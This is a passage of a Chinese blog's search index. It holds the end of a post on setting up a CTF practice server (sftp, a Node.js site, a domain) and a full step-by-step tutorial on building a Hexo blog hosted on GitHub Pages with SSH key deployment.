$YUN</code>，windows中可以直接使用<code>toYUN</code>别名切换到$YUN文件夹中来传文件(我用到bash)</li><li>在windows中使用<code>toh3110w0r1d</code>来开启sftp服务(<strong>文件相对路径默认传输到<code>/home/user/</code>文件夹下</strong>)，使用<code>bye</code>或者<code>exit</code>来退出</li><li>可以使用<code>ls</code>, <code>cd</code>, <code>pwd</code>, <code>rm</code>, <code>mkdir</code>, <code>rmdir</code>来管理<ol><li><code>get -r remote_file remote_dir</code></li><li><code>put -r local_file remote_dir</code></li></ol></li></ol></li></ol></li></ol></li></ol><h2 id="3-搭建网页"><a href="#3-搭建网页" class="headerlink" title="3. 搭建网页"></a>3. 搭建网页</h2><ol><li><a href="https://help.aliyun.com/zh/ecs/use-cases/summary-of-website-building-methods?spm=a2c4g.11186623.0.0.66c840f10Z91oO#p-43l-u9m-c5v">阿里云教程</a></li><li>搭建node.js环境，有教程，直接看就好</li><li>搞一个路由文件就OK了，方便进行文件包含和访问</li></ol><h2 id="4-域名设置"><a href="#4-域名设置" class="headerlink" title="4. 域名设置"></a>4. 域名设置</h2><ol><li>我搞的是github学生包里的namecheap中的免费一年的.me域名，折腾一下就好了</li><li><a href="https://zhuanlan.zhihu.com/p/634806678">参考文章链接</a><ol><li>注意要从github活动页进去才可以</li></ol></li><li>最后在wsl(我的话)使用<code>nslookup</code>来查询域名即可</li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfenv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用hexo和github搭建个人独立博客</title>
      <link href="/2023/12/05/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/"/>
      <url>/2023/12/05/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="1-前置工具-环境"><a href="#1-前置工具-环境" class="headerlink" title="1. 前置工具&amp;&amp;环境"></a>1. 前置工具&amp;&amp;环境</h2><ol><li>github</li><li>Node.js</li><li>hexo</li><li>git</li></ol><h2 id="2-下载node-js和git"><a href="#2-下载node-js和git" class="headerlink" title="2. 下载node.js和git"></a>2. 下载node.js和git</h2><ol><li><a href="https://git-scm.com/">Git官网</a><ol><li>点击download下载即可，一路next没啥问题<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z1.png" alt="Git Download"></li></ol></li><li><a href="https://nodejs.cn/">node.js官网</a><ol><li>Hexo是基于 Node.js 驱动的一款博客框架</li><li>也是直接点击download即可<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z2.png" alt="node.js Download"></li></ol></li><li>以上两个下载完成后再cmd控制台中输入以下，有出现版本号即可<ol><li>node -v</li><li>npm -v</li><li>git -v<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2Z3.png" alt="CMD显示"></li></ol></li></ol><h2 id="3-安装hexo"><a href="#3-安装hexo" class="headerlink" title="3. 安装hexo"></a>3. 安装hexo</h2><ol><li>在自己的目录中新建一个文件夹来存放你的博客文章<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A24.png" alt="hexo目录建立"></li><li>进入文件夹中，右键选择”显示更多选项”，点击git bash<ol><li>跟换淘宝源(下载更快一点)，使用命令行<code>npm install -g cnpm --registry=https:\//registry.npm.taobao.org</code><br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A25.png" alt="淘宝源"></li><li>下载hexo，使用命令<code>cnpm install -g hexo-cli</code></li><li>进行初始化，使用命令<code>hexo init</code>，并且文件夹中多出一堆文章(发现自己少了什么也没事，下图是写博客时照的，init成功一般就好了)<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A26.png" alt="hexo init"><br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A27.png" alt="hexo init"></li><li>在git bash中输入<code>hexo s</code>或者<code>hexo server</code>(二者一样)，有hello world界面就好了(这个界面是自带的)，出现这个界面也就成功了，hexo安装正常完毕<br> <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A28.png" alt="hexo s"></li></ol></li></ol><h2 id="4-注册github并创建库"><a href="#4-注册github并创建库" class="headerlink" title="4. 注册github并创建库"></a>4. 注册github并创建库</h2><ol><li><a href="https://github.com/">github网站</a><ol><li>需要魔法(可以直接用steam++加速github单个，现在改名叫<a href="https://steampp.net/">Watt Tookie</a>)</li><li>如果是未使用过的用户需要先注册，<em><strong>sign up</strong></em>按要求走就可以了</li><li>注册之后邮箱会收到一封Github的邮件，点击Github的链接确认注册即可<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A29.png" alt="注册图片"></li></ol></li><li>注册完毕后，创建一个仓库<ol><li>点击右上角个人头像，点击其中的Your repositories<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A210.png" alt="创建仓库"></li><li>点击右上角绿色的new按钮，输入仓库名，选择public类型，其他不用去改动它<ol><li>注意此处的仓库名一定要是<em><strong>用户名.github.io</strong></em>，否则会打不开网页<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A211.png" alt="初始化仓库"></li></ol></li><li>复制下ssh，下面要用<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A212.png" alt="ssh"></li></ol></li></ol><h2 id="5-设置ssh密钥"><a href="#5-设置ssh密钥" class="headerlink" title="5. 设置ssh密钥"></a>5. 设置ssh密钥</h2><ol><li>首先生成ssh公钥<ol><li>在git bash下输入<code>cd ~/.ssh</code>进入ssh文件</li><li>在git bash中的ssh文件中输入命令<code>ssh-keygen -t rsa -C 注册时的邮箱地址</code></li></ol></li><li>配置ssh到github中<ol><li>在我的电脑中打开<em><strong>C盘</strong></em>找到 <em><strong>用户</strong></em>，进入发现有一个.ssh的文件夹</li><li>点击进去看见<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A213.png" alt="ssh"></li><li>接下来要点开<em><strong>id_rsa.pub文件，不能是id_rsa文件</strong></em>(如果点击会改变，需要重开)，<em><strong>从头到尾复制下来</strong></em>(ssh-rsa 也要)</li><li>回到github同样点击右上角头像，找到setting按键, 将刚刚在.ssh目录下所复制的id_rsa.put文件中的信息复制进key,名字的话随便取都可以<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A214.png" alt="ssh"><br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A215.png" alt="ssh"></li><li>验证是否添加成功，输入命令<code>ssh -T git@github.com</code>并且输入yes之后，行末尾会显示你的用户名，同时会有邮箱提醒</li></ol></li><li>最后对本地的git进行全局配置<ol><li>输入命令：<code>git config --global user.name &quot;注册时用户名&quot;</code></li><li>输入命令：<code>git config --global user.email &quot;注册时邮箱&quot;</code></li></ol></li></ol><h2 id="6-撰写文章并发布"><a href="#6-撰写文章并发布" class="headerlink" title="6. 撰写文章并发布"></a>6. 撰写文章并发布</h2><ol><li><p>先打开目录下的_config.yml文件</p><ol><li><p>ctrl+f搜索关键字deploy</p></li><li><p>将deploy部分替换为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:  </span><br><span class="line">   type: git  </span><br><span class="line">   repo: git@github.com:用户名/用户名.github.io.git    #这个是使用ssh的格式，注释可以不用加入</span><br><span class="line">   branch: main</span><br></pre></td></tr></table></figure></li></ol></li><li><p>需要安装上传工具</p><ol><li>在gitbash中输入命令 <em><strong>cnpm install hexo-deployer-git</strong></em></li><li>需要在文件的根目录下运行命令</li></ol></li><li><p>在hexo中创建文章(md格式)</p><ol><li>在hexo中写博客是要浅学以下markdown的喔，一天基本就能学会了</li><li>写markdown的文章我是直接使用vscode，网上教程看一下就好</li><li>使用hexo new命令创建新文章<ol><li>在哪里使用该命令都可以，会自动在soure中的_posts文件夹下产生md文件(也可以直接_posts文件夹中右键创建)<br>  <img src="/pic/%E5%88%A9%E7%94%A8hexo%E5%92%8Cgithub%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E7%8B%AC%E7%AB%8B%E5%8D%9A%E5%AE%A2/%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A216.png" alt="hexo new"></li></ol></li></ol></li><li><p>进行文章编写后预览</p><ol><li>vscode中文章编写完成后ctrl+s保存</li><li>在git bash中输入命令(在哪都可以)<code>hexo s</code>或者<code>hexo server</code>(上文有提到过)</li><li>会返回一个本机网址，进入网址即可看到自己的博客界面(默认主题未上传)</li></ol></li><li><p>将文章上传至github上</p><ol><li>输入命令<code>hexo g</code>先生成静态文件再<code>hexo d</code>部署到github上</li><li>再次访问个人网站即会出现你所作的更改啦(有时要等一会儿，不会马上就改变)</li></ol></li></ol><h2 id="7-结语"><a href="#7-结语" class="headerlink" title="7. 结语"></a>7. 结语</h2><p>到这里hexo+github搭建个人博客就已经完成了，开始记录从0到1的成长之路吧！！！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
